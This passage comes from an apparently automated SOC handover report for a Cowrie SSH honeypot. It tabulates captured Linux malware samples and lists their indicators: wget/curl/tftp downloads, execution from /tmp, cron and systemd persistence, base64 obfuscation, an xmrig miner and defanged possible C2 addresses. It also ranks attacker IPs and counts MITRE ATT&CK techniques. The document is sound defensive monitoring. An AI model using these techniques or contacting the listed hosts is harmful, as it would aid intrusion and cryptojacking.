| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `115.190.249[.]177` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 35 |
| `195.96.139[.]10` | GB | Driftnet Ltd | **100** ⚠️ | 9 |
| `115.190.126[.]68` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 36 |
| `72.46.87[.]211` | SG | Latitude.sh | **100** ⚠️ | 5 |
| `108.54.8[.]132` | US | Verizon Business | **100** ⚠️ | 2 |
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `77.90.185[.]14` | LT | Limited Network LTD | **100** ⚠️ | 50 |
| `129.121.117[.]162` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 23 |
| `35.206.158[.]12` | BE | Google LLC | **100** ⚠️ | 3 |
| `45.79.115[.]134` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 42 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 35 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 6 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 75 cases |
| Tool 34  | Credential Extractor        | ✅ 96 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 12 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 57 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (26.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 29 priority case(s) shown individually · 26 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-04T03:49:52Z_
